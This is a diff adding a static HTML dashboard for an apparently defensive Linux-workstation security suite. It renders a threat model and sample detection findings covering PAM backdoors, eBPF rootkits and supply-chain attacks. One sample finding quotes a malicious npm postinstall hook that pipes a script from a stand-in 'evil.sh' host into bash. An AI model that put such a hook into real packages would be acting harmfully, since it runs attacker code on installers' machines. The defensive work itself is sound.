@@ -1,0 +1,340 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>defensive-suite · collector dashboard</title>
+<style>
+  :root{
+    --bg:#0a0d13; --panel:#11161f; --panel2:#0e131b; --line:#1e2632; --line2:#2a3442;
+    --txt:#e6e9ef; --muted:#8a93a3; --faint:#5b6472;
+    --accent:#33d6c0; --accent2:#7c9cff;
+    --crit:#ff4d5e; --high:#ff894d; --med:#f5c451; --low:#4aa3ff; --info:#7d8794;
+    --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,monospace;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0;background:var(--bg);color:var(--txt);
+    font-family:Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    -webkit-font-smoothing:antialiased;font-size:14px;line-height:1.5}
+  a{color:var(--accent2);text-decoration:none}
+  a:hover{text-decoration:underline}
+  .wrap{max-width:1180px;margin:0 auto;padding:28px 20px 64px}
+  code,.mono{font-family:var(--mono)}
+
+  header.top{display:flex;align-items:flex-start;justify-content:space-between;gap:20px;flex-wrap:wrap;margin-bottom:22px}
+  .brand{display:flex;align-items:center;gap:14px}
+  .logo{width:42px;height:42px;border-radius:10px;flex:none;
+    background:radial-gradient(120% 120% at 30% 20%,#1b3a36,#0c1a18);
+    border:1px solid #1f3b37;display:grid;place-items:center}
+  .logo svg{width:24px;height:24px}
+  h1{font-size:20px;margin:0;letter-spacing:.2px}
+  h1 b{color:var(--accent)}
+  .sub{color:var(--muted);font-size:12.5px;margin-top:2px}
+  .posture{display:flex;align-items:center;gap:10px;padding:10px 14px;border:1px solid var(--line2);border-radius:12px;background:var(--panel)}
+  .posture .dot{width:11px;height:11px;border-radius:50%}
+  .posture .lbl{font-size:11px;text-transform:uppercase;letter-spacing:.12em;color:var(--muted)}
+  .posture .val{font-weight:600}
+
+  .kpis{display:grid;grid-template-columns:repeat(6,1fr);gap:12px;margin-bottom:22px}
+  .kpi{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:13px 14px}
+  .kpi .n{font-size:22px;font-weight:700;font-variant-numeric:tabular-nums}
+  .kpi .k{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.1em;margin-top:2px}
+  .kpi.sev .n{display:flex;align-items:baseline;gap:7px}
+  .kpi .bar{height:3px;border-radius:3px;margin-top:9px;background:var(--line2)}
+
+  h2.section{font-size:12px;text-transform:uppercase;letter-spacing:.14em;color:var(--muted);
+    margin:30px 0 12px;display:flex;align-items:center;gap:10px}
+  h2.section::after{content:"";flex:1;height:1px;background:var(--line)}
+
+  .toolbar{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-bottom:14px}
+  select,input[type=search]{background:var(--panel2);color:var(--txt);border:1px solid var(--line2);
+    border-radius:9px;padding:8px 11px;font-size:13px;font-family:inherit}
+  input[type=search]{min-width:220px;flex:1}
+  select:focus,input:focus{outline:none;border-color:var(--accent)}
+  .btn{background:var(--panel2);color:var(--txt);border:1px solid var(--line2);border-radius:9px;
+    padding:8px 12px;font-size:12.5px;cursor:pointer}
+  .btn:hover{border-color:var(--accent)}
+
+  table{width:100%;border-collapse:collapse;font-size:13px}
+  thead th{position:sticky;top:0;text-align:left;color:var(--muted);font-weight:600;font-size:11px;
+    text-transform:uppercase;letter-spacing:.08em;padding:9px 10px;background:var(--panel2);
+    border-bottom:1px solid var(--line2)}
+  tbody td{padding:10px;border-bottom:1px solid var(--line);vertical-align:top}
+  tbody tr:hover{background:#0e141d}
+  .findings{border:1px solid var(--line);border-radius:12px;overflow:hidden;background:var(--panel)}
+  .scroll{max-height:520px;overflow:auto}
+  td.path{color:var(--muted);font-family:var(--mono);font-size:12px;word-break:break-all;max-width:260px}
+  td.title{max-width:420px}
+  td.title .det{color:var(--faint);font-size:12px;margin-top:3px}
+
+  .pill{display:inline-flex;align-items:center;gap:6px;padding:2px 9px;border-radius:999px;font-size:11px;
+    font-weight:600;white-space:nowrap}
+  .pill .d{width:7px;height:7px;border-radius:50%}
+  .sev-critical{color:var(--crit);background:rgba(255,77,94,.12)} .sev-critical .d{background:var(--crit)}
+  .sev-high{color:var(--high);background:rgba(255,137,77,.12)} .sev-high .d{background:var(--high)}
+  .sev-medium{color:var(--med);background:rgba(245,196,81,.12)} .sev-medium .d{background:var(--med)}
+  .sev-low{color:var(--low);background:rgba(74,163,255,.12)} .sev-low .d{background:var(--low)}
+  .sev-info{color:var(--info);background:rgba(125,135,148,.12)} .sev-info .d{background:var(--info)}
+  .tag{font-family:var(--mono);font-size:11px;color:var(--accent2);background:rgba(124,156,255,.1);
+    border:1px solid rgba(124,156,255,.2);border-radius:6px;padding:1px 6px;white-space:nowrap}
+  .empty{padding:34px;text-align:center;color:var(--muted)}
+
+  .tools{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+  .tcard{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:14px;
+    display:flex;flex-direction:column;gap:8px}
+  .tcard .h{display:flex;align-items:center;justify-content:space-between;gap:8px}
+  .tcard .name{font-family:var(--mono);font-weight:600}
+  .tcard .job{color:var(--muted);font-size:12.5px;min-height:34px}
+  .tcard .stack{font-size:11px;color:var(--faint)}
+  .tcard .foot{display:flex;align-items:center;justify-content:space-between;margin-top:4px;
+    padding-top:9px;border-top:1px solid var(--line)}
+  .stat{display:inline-flex;align-items:center;gap:6px;font-size:11.5px}
+  .stat .d{width:8px;height:8px;border-radius:50%}
+  .ok{color:var(--accent)} .ok .d{background:var(--accent)}
+  .bad{color:var(--crit)} .bad .d{background:var(--crit)}
+
+  .threats{display:grid;grid-template-columns:repeat(2,1fr);gap:12px}
+  .threat{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:13px 14px}
+  .threat .t{font-weight:600;margin-bottom:3px}
+  .threat .desc{color:var(--muted);font-size:12.5px;margin-bottom:9px}
+  .threat .by{display:flex;gap:6px;flex-wrap:wrap}
+  .chip{font-family:var(--mono);font-size:11px;padding:2px 8px;border-radius:6px;
+    background:rgba(51,214,192,.08);color:var(--accent);border:1px solid rgba(51,214,192,.22)}
+
+  .note{display:flex;gap:12px;background:linear-gradient(180deg,#10171a,#0c1115);
+    border:1px solid #1c3a36;border-radius:12px;padding:15px 16px;color:#cfe9e4;font-size:13px}
+  .note b{color:var(--accent)}
+  .banner{font-size:12px;color:var(--muted);background:var(--panel2);border:1px dashed var(--line2);
+    border-radius:10px;padding:9px 12px;margin-bottom:18px;display:flex;gap:9px;align-items:center;flex-wrap:wrap}
+  footer{margin-top:40px;color:var(--faint);font-size:12px;border-top:1px solid var(--line);padding-top:16px;
+    display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+  @media(max-width:880px){.kpis{grid-template-columns:repeat(3,1fr)}.tools,.threats{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <header class="top">
+    <div class="brand">
+      <div class="logo" aria-hidden="true">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#33d6c0" stroke-width="1.8" stroke-linejoin="round" stroke-linecap="round">
+          <path d="M12 2l8 3v6c0 5-3.5 8.5-8 11-4.5-2.5-8-6-8-11V5l8-3z"/>
+          <path d="M9 12l2 2 4-4"/>
+        </svg>
+      </div>
+      <div>
+        <h1><b>defensive</b>-suite <span style="color:var(--faint);font-weight:400">· collector</span></h1>
+        <div class="sub">Six composable tools for the Linux-workstation threat cluster — poisoned dep → credential theft → eBPF rootkit.</div>
+      </div>
+    </div>
+    <div class="posture" id="posture">
+      <span class="dot" id="postureDot"></span>
+      <div><div class="lbl">posture</div><div class="val" id="postureVal">—</div></div>
+    </div>
+  </header>
+
+  <div class="banner">
+    <span>▟ Showing <b style="color:var(--txt)">sample</b> collector data.</span>
+    <span>Drop in real output of <code>&lt;tool&gt; check --format json</code> to render live findings →</span>
+    <label class="btn" style="cursor:pointer">Load report JSON<input id="file" type="file" accept="application/json,.json" hidden multiple></label>
+    <button class="btn" id="reset">Reset to sample</button>
+  </div>
+
+  <div class="kpis" id="kpis"></div>
+
+  <h2 class="section">findings</h2>
+  <div class="toolbar">
+    <input id="q" type="search" placeholder="Search title, path, check, technique…">
+    <select id="fTool"><option value="">All tools</option></select>
+    <select id="fSev">
+      <option value="">All severities</option>
+      <option value="critical">Critical</option><option value="high">High</option>
+      <option value="medium">Medium</option><option value="low">Low</option><option value="info">Info</option>
+    </select>
+    <select id="fTech"><option value="">All techniques</option></select>
+    <span id="count" style="color:var(--muted);font-size:12px;margin-left:auto"></span>
+  </div>
+  <div class="findings"><div class="scroll"><table>
+    <thead><tr><th>Severity</th><th>Tool</th><th>Check</th><th>Finding</th><th>Path</th><th>ATT&CK</th></tr></thead>
+    <tbody id="rows"></tbody>
+  </table></div></div>
+
+  <h2 class="section">tools</h2>
+  <div class="tools" id="tools"></div>
+
+  <h2 class="section">threat model → defense</h2>
+  <div class="threats" id="threats"></div>
+
+  <h2 class="section">architecture principle</h2>
+  <div class="note">
+    <span>◆</span>
+    <div>At least one detection path must <b>not</b> run on the potentially-compromised kernel. A live host with an
+    eBPF rootkit lies to <code>ps</code>, <code>ss</code>, <code>bpftool</code> and every eBPF-based EDR — so
+    <code>bpfsentry</code> adds early-boot baselining and offline memory forensics, and any divergence between the live
+    <code>bpftool</code> view and the memory-dump <code>prog_idr</code> walk is itself proof of a <code>sys_bpf</code>-hooking
+    implant. Trust anchors (AIDE DBs, baselines, BPF allowlists) live <b>off-host</b>, writable but not readable by the
+    monitored machine.</div>
+  </div>
+
+  <footer>
+    <span>defensive-suite · dashboard is a static, dependency-free single file</span>
+    <span><a href="https://github.com/mtclinton/defensive-suite">github.com/mtclinton/defensive-suite</a></span>
+  </footer>
+</div>
+
+<script>
+/* ---- tool catalogue (from README) ---- */
+const TOOLS = [
+  {id:"authwatch",   job:"Auth-stack & persistence integrity (PAM / OpenSSH / authorized_keys / ld.so.preload)", stack:"Go + AIDE + auditd"},
+  {id:"instguard",   job:"Supply-chain install-time guard (npm / pip / AUR hooks, lockfile drift, OSV)",          stack:"Go"},
+  {id:"credsentinel",job:"Secret-exposure scanner + honeytokens",                                                 stack:"Go + gitleaks/TruffleHog + Canarytokens"},
+  {id:"egresswatch", job:"Egress visibility + magic-packet backdoor detection",                                   stack:"Go + eBPF (cilium/ebpf)"},
+  {id:"posturescan", job:"Kernel & container hardening posture (sysctls, caps, rootless Podman)",                 stack:"Go/Python + Lynis/OpenSCAP"},
+  {id:"bpfsentry",   job:"Offline eBPF-program enumerator + out-of-band memory forensics",                        stack:"Go (cilium/ebpf) + Python (Volatility 3)"},
+];
+
+/* ---- threat model (from docs/THREAT_MODEL.md) ---- */
+const THREATS = [
+  {t:"eBPF rootkits (commodity)", d:"IronWorm, atomic-lockfile, LinkPro, BPFDoor lineage — hide files/procs/sockets and themselves from bpftool; magic-packet C2.", by:["bpfsentry","egresswatch"]},
+  {t:"atomic-lockfile / “Atomic Arch” AUR", d:"400+ AUR packages; preinstall ELF steals .npmrc/.aws/.kube/.docker/Vault data; optional root eBPF rootkit.", by:["instguard","credsentinel"]},
+  {t:"QLNX (Quasar Linux RAT)", d:"Compiles two PAM backdoors on-host; persists via LD_PRELOAD/ld.so.preload; eBPF rootkit; fake X11 lockfile.", by:["authwatch","posturescan"]},
+  {t:"Velvet Ant / Operation Highland", d:"Backdoored pam_unix.so (9 variants) + OpenSSH binaries; appended authorized_keys.", by:["authwatch"]},
+  {t:"npm / registry attacks", d:"Mastra/easy-day-js, IronWorm, Shai-Hulud, codexui-android, TrapDoor — typosquats + install-time stealers, cross-registry.", by:["instguard","credsentinel"]},
+  {t:"Kernel LPE + container escape", d:"Copy Fail, DirtyDecrypt, Dirty Frag, ssh-keysign-pwn (ptrace race fixed by yama.ptrace_scope=2).", by:["posturescan"]},
+  {t:"BPFDoor / Symbiote magic-packet", d:"Passive, portless raw-socket BPF filter; magic-packet activation.", by:["egresswatch"]},
+  {t:"Secret / credential exposure", d:"Private-CISA GitHub leak — long-lived credentials at rest in dotfiles / repos.", by:["credsentinel"]},
+];
+
+/* ---- sample collector findings (schema matches each tool's check --format json) ---- */
+const SAMPLE = [
+  {tool:"authwatch", check:"pam", severity:"critical", title:"unowned PAM module — no package provides it", detail:"a security .so installed outside the package manager is a high-confidence PAM backdoor", path:"/usr/lib64/security/pam_exec2.so", technique:"T1556.003", sigma:"lnx_auditd_pam_backdoor"},
+  {tool:"authwatch", check:"preload", severity:"critical", title:"ld.so.preload is populated", detail:"/tmp/.lib/hook.so", path:"/etc/ld.so.preload", technique:"T1574.006", sigma:"lnx_auditd_ld_so_preload_mod"},
+  {tool:"authwatch", check:"authkeys", severity:"high", title:"unattributable authorized_keys entry", detail:"type=ssh-ed25519 fp=SHA256:9Qx… comment=backup@h", path:"/root/.ssh/authorized_keys", technique:"T1098.004"},
+  {tool:"authwatch", check:"pkgverify", severity:"info", title:"all auth binaries match distro checksums", detail:"sshd, ssh, sudo, libc verified", path:""},
+
+  {tool:"instguard", check:"hooks", severity:"critical", title:"postinstall pipes a remote script into a shell", detail:"\"postinstall\": \"curl -s https://cdn.evil.sh | bash\"", path:"node_modules/easy-day-js/package.json", technique:"T1059.004"},
+  {tool:"instguard", check:"osv", severity:"critical", title:"OSV.dev returned a MAL- advisory for a pinned version", detail:"MAL-2026-0142 · atomic-lockfile@6.6.6", path:"package-lock.json", technique:"T1195.002"},
+  {tool:"instguard", check:"lockfile", severity:"high", title:"dependency present in lockfile but not package.json", detail:"node_modules/foo/node_modules/evil@6.6.6 (transitive, nested copy)", path:"package-lock.json", technique:"T1195.002"},
+  {tool:"instguard", check:"cooldown", severity:"medium", title:"pinned version published within the release-age cooldown", detail:"left-pad-helper@2.0.1 published 1d ago (min 3d)", path:"package-lock.json"},
+
+  {tool:"credsentinel", check:"trufflehog", severity:"critical", title:"verified-live credential found — rotate now", detail:"AWS access key, verified against STS", path:"~/.aws/credentials", technique:"T1552.001"},
+  {tool:"credsentinel", check:"honeytoken", severity:"critical", title:"honeytoken tripped — decoy credential was read", detail:"assume compromise; escalate to bpfsentry offline check", path:"~/.aws/credentials.bak", technique:"T1552.001", sigma:"lnx_auditd_credsentinel_honeytoken_read"},
+  {tool:"credsentinel", check:"builtinscan", severity:"high", title:"private key material at rest", detail:"-----BEGIN OPENSSH PRIVATE KEY-----", path:"~/projects/api/deploy.key"},
+  {tool:"credsentinel", check:"honeytoken", severity:"info", title:"3 honeytokens deployed and quiet", detail:"aws-bak, kubeconfig-decoy, env-dns-token", path:""},
+
+  {tool:"egresswatch", check:"triage", severity:"critical", title:"raw AF_PACKET socket on a process with a deleted executable", detail:"pid=1337 comm=(deleted) — BPFDoor-class, corroborated", path:"/proc/1337", technique:"T1205.002"},
+  {tool:"egresswatch", check:"egress", severity:"medium", title:"outbound connection not on the egress allowlist", detail:"node → 23.254.164.123:4444", path:"", technique:"T1071"},
+  {tool:"egresswatch", check:"triage", severity:"high", title:"raw packet socket present (review)", detail:"pid=812 comm=dhclient — uncorroborated", path:"/proc/812"},
+
+  {tool:"posturescan", check:"caps", severity:"critical", title:"stray CAP_BPF granted to a non-eBPF unit", detail:"AmbientCapabilities=~CAP_NET_BIND_SERVICE (inverted → keeps CAP_BPF)", path:"/etc/systemd/system/scan.service", technique:"T1548"},
+  {tool:"posturescan", check:"sysctl", severity:"high", title:"kernel.yama.ptrace_scope DIFFERENT (want 2, got 0)", detail:"the ssh-keysign-pwn fix is not applied", path:"/proc/sys/kernel/yama/ptrace_scope"},
+  {tool:"posturescan", check:"sysctl", severity:"high", title:"kernel.unprivileged_bpf_disabled DIFFERENT (want 1|2, got 0)", detail:"unprivileged bpf() is enabled", path:"/proc/sys/kernel/unprivileged_bpf_disabled"},
+  {tool:"posturescan", check:"podman", severity:"medium", title:"container runs without a seccomp profile (effectively unconfined)", detail:"defaultAction=SCMP_ACT_ALLOW, no rules", path:"workload/config.json"},
+
+  {tool:"bpfsentry", check:"divergence", severity:"critical", title:"program present in the memory dump but hidden from the live bpftool view", detail:"kprobe@__x64_sys_bpf — proof of a sys_bpf-hooking rootkit; reinstall, do not clean", path:"oob:prog_idr#481", technique:"T1014"},
+  {tool:"bpfsentry", check:"baseline", severity:"high", title:"BPF program uses a suspicious helper", detail:"bpf_probe_write_user on an allowlisted-looking program", path:"prog:tag=ab12…", technique:"T1562.001"},
+  {tool:"bpfsentry", check:"baseline", severity:"critical", title:"unnamed kretprobe attached at a hook nobody can name", detail:"not in the early-boot allowlist", path:"prog:id=512", technique:"T1014"},
+  {tool:"bpfsentry", check:"status", severity:"info", title:"Tetragon recorded 0 unexpected bpf() loads", detail:"load-time visibility healthy", path:""},
+];
+
+const SEV_ORDER = {critical:0,high:1,medium:2,low:3,info:4};
+let DATA = SAMPLE.slice();
+
+/* ---------- rendering ---------- */
+const $ = s => document.querySelector(s);
+const el = (t,c,h)=>{const e=document.createElement(t);if(c)e.className=c;if(h!=null)e.innerHTML=h;return e;};
+function sevPill(s){return `<span class="pill sev-${s}"><span class="d"></span>${s}</span>`;}
+
+function renderKpis(){
+  const by={critical:0,high:0,medium:0,low:0,info:0};
+  DATA.forEach(f=>by[f.severity]=(by[f.severity]||0)+1);
+  const worst = DATA.reduce((w,f)=>Math.min(w,SEV_ORDER[f.severity]??4),4);
+  const clean = worst>=2; // clean = nothing >= medium
+  const worstName = Object.keys(SEV_ORDER).find(k=>SEV_ORDER[k]===worst)||"info";
+  $("#postureVal").textContent = clean ? "CLEAN" : worstName.toUpperCase();
+  $("#postureDot").style.background = clean ? "var(--accent)" : `var(--${worstName==="critical"?"crit":worstName==="high"?"high":"med"})`;
+  const sev=(k,col)=>`<div class="kpi sev"><div class="n" style="color:var(--${col})">${by[k]||0}</div><div class="k">${k}</div><div class="bar" style="background:var(--${col});opacity:${by[k]?.5:.12}"></div></div>`;
+  $("#kpis").innerHTML =
+    `<div class="kpi"><div class="n">${DATA.length}</div><div class="k">findings</div><div class="bar"></div></div>`+
+    sev("critical","crit")+sev("high","high")+sev("medium","med")+sev("low","low")+
+    `<div class="kpi"><div class="n" style="color:${clean?'var(--accent)':'var(--crit)'}">${clean?'✓':'✗'}</div><div class="k">clean run</div><div class="bar" style="background:${clean?'var(--accent)':'var(--crit)'};opacity:.5"></div></div>`;
+}
+
+function populateFilters(){
+  const tools=[...new Set(DATA.map(f=>f.tool))].sort();
+  $("#fTool").innerHTML = `<option value="">All tools</option>`+tools.map(t=>`<option>${t}</option>`).join("");
+  const tech=[...new Set(DATA.map(f=>f.technique).filter(Boolean))].sort();
+  $("#fTech").innerHTML = `<option value="">All techniques</option>`+tech.map(t=>`<option>${t}</option>`).join("");
+}
+
+function renderRows(){
+  const q=$("#q").value.toLowerCase(), ft=$("#fTool").value, fs=$("#fSev").value, fx=$("#fTech").value;
+  const rows = DATA.filter(f=>{
+    if(ft&&f.tool!==ft)return false; if(fs&&f.severity!==fs)return false; if(fx&&f.technique!==fx)return false;
+    if(q){const hay=(f.title+" "+(f.detail||"")+" "+(f.path||"")+" "+f.check+" "+(f.technique||"")).toLowerCase();if(!hay.includes(q))return false;}
+    return true;
+  }).sort((a,b)=>SEV_ORDER[a.severity]-SEV_ORDER[b.severity] || a.tool.localeCompare(b.tool));
+  $("#count").textContent = `${rows.length} of ${DATA.length}`;
+  const tb=$("#rows"); tb.innerHTML="";
+  if(!rows.length){tb.innerHTML=`<tr><td colspan="6"><div class="empty">No findings match the filters.</div></td></tr>`;return;}
+  for(const f of rows){
+    const tr=el("tr");
+    tr.innerHTML =
+      `<td>${sevPill(f.severity)}</td>`+
+      `<td><span class="mono">${f.tool}</span></td>`+
+      `<td><span class="mono" style="color:var(--muted)">${f.check}</span></td>`+
+      `<td class="title">${esc(f.title)}${f.detail?`<div class="det mono">${esc(f.detail)}</div>`:""}${f.sigma?` <span class="tag">σ ${f.sigma}</span>`:""}</td>`+
+      `<td class="path">${f.path?esc(f.path):"—"}</td>`+
+      `<td>${f.technique?`<span class="tag">${f.technique}</span>`:"—"}</td>`;
+    tb.appendChild(tr);
+  }
+}
+
+function renderTools(){
+  const counts={}; DATA.forEach(f=>{(counts[f.tool]=counts[f.tool]||{n:0,worst:4}); counts[f.tool].n++; counts[f.tool].worst=Math.min(counts[f.tool].worst,SEV_ORDER[f.severity]);});
+  $("#tools").innerHTML = TOOLS.map(t=>{
+    const c=counts[t.id]; const has=!!c; const clean=!has||c.worst>=2;
+    const statusTxt = !has ? "no data" : clean ? `${c.n} info/low` : `${c.n} findings`;
+    return `<div class="tcard">
+      <div class="h"><span class="name">${t.id}</span>
+        <span class="stat ${clean?'ok':'bad'}"><span class="d"></span>${clean?'clean':'attention'}</span></div>
+      <div class="job">${t.job}</div>
+      <div class="foot"><span class="stack">${t.stack}</span><span style="color:var(--muted);font-size:11.5px">${statusTxt}</span></div>
+    </div>`;}).join("");
+}
+
+function renderThreats(){
+  $("#threats").innerHTML = THREATS.map(x=>`<div class="threat">
+    <div class="t">${x.t}</div><div class="desc">${x.d}</div>
+    <div class="by">${x.by.map(b=>`<span class="chip">${b}</span>`).join("")}</div></div>`).join("");
+}
+
+function esc(s){return String(s).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));}
+
+function renderAll(){renderKpis();populateFilters();renderRows();renderTools();renderThreats();}
+
+/* ---------- live report loading ---------- */
+function ingest(obj){
+  // accepts a single Report {tool,findings:[...]} or an array of them, or a bare findings array
+  const out=[];
+  const reps = Array.isArray(obj)?obj:[obj];
+  for(const r of reps){
+    if(r&&Array.isArray(r.findings)){for(const f of r.findings)out.push({...f,tool:f.tool||r.tool||"?"});}
+    else if(r&&r.severity){out.push(r);}
+  }
+  return out;
+}
+$("#file").addEventListener("change",async e=>{
+  const files=[...e.target.files]; if(!files.length)return;
+  const all=[];
+  for(const file of files){try{all.push(...ingest(JSON.parse(await file.text())));}catch(err){alert("Could not parse "+file.name+": "+err.message);}}
+  if(all.length){DATA=all;$("#q").value="";$("#fTool").value="";$("#fSev").value="";$("#fTech").value="";renderAll();
+    document.querySelector(".banner span b").textContent="live";}
+});
+$("#reset").addEventListener("click",()=>{DATA=SAMPLE.slice();renderAll();document.querySelector(".banner span b").textContent="sample";});
+["q","fTool","fSev","fTech"].forEach(id=>$("#"+id).addEventListener("input",renderRows));
+
+renderAll();
+</script>
+</body>
+</html>
